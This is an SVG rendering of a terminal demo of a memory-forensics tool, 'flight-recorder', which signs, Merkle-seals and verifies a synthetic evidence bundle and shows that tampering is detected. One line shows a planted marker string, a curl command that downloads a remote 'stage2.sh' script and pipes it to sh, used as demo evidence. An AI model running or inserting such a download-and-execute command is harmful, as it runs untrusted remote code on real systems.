<rect width="780" height="606" rx="10" fill="#0d1117"/>
<rect width="780" height="38" rx="10" fill="#161b22"/>
<rect y="28" width="780" height="10" fill="#161b22"/>
<circle cx="24" cy="19" r="6" fill="#ff5f56"/>
<circle cx="44" cy="19" r="6" fill="#ffbd2e"/>
<circle cx="64" cy="19" r="6" fill="#27c93f"/>
<text x="240" y="24" fill="#8b949e" font-size="12">flight-recorder — no kernel, no root, no cluster</text>
<text class="l0" y="56"><tspan x="26.0" fill="#8b949e">$ </tspan><tspan x="42.2" fill="#58a6ff">flight-recorder demo</tspan></text>
<text class="l2" y="100"><tspan x="26.0" fill="#8b949e">  [1] </tspan><tspan x="74.6" fill="#c9d1d9">signing key           </tspan><tspan x="252.8" fill="#8b949e">./demo/demo-key.pem (generated) key id 67f3672c0b3057d6</tspan></text>
<text class="l3" y="122"><tspan x="26.0" fill="#8b949e">  [2] </tspan><tspan x="74.6" fill="#c9d1d9">synthetic acquisition </tspan><tspan x="252.8" fill="#8b949e">262144 bytes across 2 regions, outcome complete</tspan></text>
<text class="l4" y="144"><tspan x="26.0" fill="#8b949e">  [3] </tspan><tspan x="74.6" fill="#c9d1d9">merkle seal           </tspan><tspan x="252.8" fill="#8b949e">root c60318963689c015e04659f307f71fb8... (64 leaves, depth 7)</tspan></text>
<text class="l5" y="166"><tspan x="26.0" fill="#8b949e">  [4] </tspan><tspan x="74.6" fill="#c9d1d9">ecdsa signature       </tspan><tspan x="252.8" fill="#8b949e">ecdsa-p256-sha256-asn1 over the root</tspan></text>
<text class="l6" y="188"><tspan x="26.0" fill="#8b949e">  [5] </tspan><tspan x="74.6" fill="#c9d1d9">CASE/UCO bundle       </tspan><tspan x="252.8" fill="#8b949e">14 objects, digest 1a3f0f42c978749d</tspan></text>
<text class="l7" y="210"><tspan x="26.0" fill="#8b949e">  [6] </tspan><tspan x="74.6" fill="#c9d1d9">evidence bundle       </tspan><tspan x="252.8" fill="#8b949e">./demo/evidence/6b3f8dbe-0575-4b2d-937c-978a24a09430</tspan></text>
<text class="l8" y="232"><tspan x="26.0" fill="#8b949e">  [7] </tspan><tspan x="74.6" fill="#c9d1d9">verification          </tspan><tspan x="252.8" fill="#3fb950">VERIFIED</tspan><tspan x="317.6" fill="#8b949e">  merkle root c60318963689c015...</tspan></text>
<text class="l9" y="254"><tspan x="26.0" fill="#8b949e">  [8] </tspan><tspan x="74.6" fill="#c9d1d9">tamper detection      </tspan><tspan x="252.8" fill="#8b949e">flipped one byte -&gt; verification correctly </tspan><tspan x="601.1" fill="#f85149">FAILED</tspan></text>
<text class="l11" y="298"><tspan x="26.0" fill="#8b949e">marker planted in synthetic memory:</tspan></text>
<text class="l12" y="320"><tspan x="26.0" fill="#d29922">  "curl -s http://198.51.100.23/stage2.sh | sh"</tspan></text>
<text class="l14" y="364"><tspan x="26.0" fill="#8b949e">$ </tspan><tspan x="42.2" fill="#58a6ff">flight-recorder verify --bundle ./evidence/6b3f8dbe --key pub.pem</tspan></text>
<text class="l16" y="408"><tspan x="26.0" fill="#3fb950">  [ OK ] </tspan><tspan x="98.9" fill="#c9d1d9">manifest file digests   5 file(s)</tspan></text>
<text class="l17" y="430"><tspan x="26.0" fill="#3fb950">  [ OK ] </tspan><tspan x="98.9" fill="#c9d1d9">ecdsa signature</tspan></text>
<text class="l18" y="452"><tspan x="26.0" fill="#3fb950">  [ OK ] </tspan><tspan x="98.9" fill="#c9d1d9">merkle root             c60318963689c015e04659f307f71fb8f991b97d...</tspan></text>
<text class="l19" y="474"><tspan x="26.0" fill="#3fb950">  [ OK ] </tspan><tspan x="98.9" fill="#c9d1d9">CASE/UCO structure</tspan></text>
<text class="l21" y="518"><tspan x="26.0" fill="#3fb950">VERIFIED</tspan><tspan x="90.8" fill="#bc8cff">  6b3f8dbe-0575-4b2d-937c-978a24a09430</tspan></text>
<rect class="cursor" x="26" y="528" width="8.1" height="15" fill="#3fb950"/>
</svg>
